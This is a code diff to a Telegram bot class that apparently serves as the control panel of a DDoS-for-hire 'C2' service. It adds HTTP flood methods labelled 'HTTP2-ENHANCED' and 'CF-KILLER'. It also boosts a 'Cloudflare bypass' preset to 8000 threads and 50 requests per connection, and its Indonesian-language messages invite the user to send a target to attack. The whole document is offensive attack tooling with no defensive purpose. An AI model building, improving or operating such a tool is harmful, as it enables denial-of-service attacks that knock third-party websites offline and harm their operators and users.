@@ -47,7 +47,8 @@ export class TelegramBotInline {
             [Markup.button.callback('GET', 'method_GET'), Markup.button.callback('POST', 'method_POST')],
             [Markup.button.callback('HTTP2', 'method_HTTP2'), Markup.button.callback('HTTP3', 'method_HTTP3')],
             [Markup.button.callback('CFB', 'method_CFB'), Markup.button.callback('BYPASS', 'method_BYPASS')],
-            [Markup.button.callback('HTTP2-CF', 'method_HTTP2-CF'), Markup.button.callback('ULTIMATE', 'method_ULTIMATE')],
+            [Markup.button.callback('HTTP2-CF', 'method_HTTP2-CF'), Markup.button.callback('🚀 HTTP2-ENHANCED', 'method_HTTP2-ENHANCED')],
+            [Markup.button.callback('ULTIMATE', 'method_ULTIMATE'), Markup.button.callback('CF-KILLER', 'method_CF-KILLER')],
             [Markup.button.callback('➡️ More Methods', 'layer7_page2'), Markup.button.callback('« Back', 'back_layer')]
         ]);
     }
@@ -280,19 +281,20 @@ export class TelegramBotInline {
                 type: 'c2', 
                 step: 'target',
                 preset: 'cf',
-                method: 'HTTP2-CF,CFB,BYPASS',
-                threads: 5000,
+                method: 'HTTP2-ENHANCED,HTTP2-CF,CF-KILLER',
+                threads: 8000,
                 duration: 300,
-                rpc: 10
+                rpc: 50
             };
             this.userSessions.set(ctx.from.id, session);
             
             ctx.editMessageText(
-                '🔥 *CLOUDFLARE BYPASS PRESET*\n\n' +
-                'Preset khusus buat tembus Cloudflare!\n\n' +
-                'Methods: HTTP2-CF, CFB, BYPASS\n' +
-                'Threads: 5000\n' +
-                'Durasi: 300 detik\n\n' +
+                '🚀 *ULTIMATE CLOUDFLARE BYPASS PRESET*\n\n' +
+                'Preset TERBARU dengan method paling gacor!\n\n' +
+                '🔥 Methods: HTTP2-ENHANCED, HTTP2-CF, CF-KILLER\n' +
+                '⚡ Threads: 8000 (MAXIMIZED!)\n' +
+                '⏱️ Durasi: 300 detik\n' +
+                '🎯 RPC: 50 (5x lebih kuat!)\n\n' +
                 'Kirim target yang mau lu hajar:',
                 { parse_mode: 'Markdown' }
             );
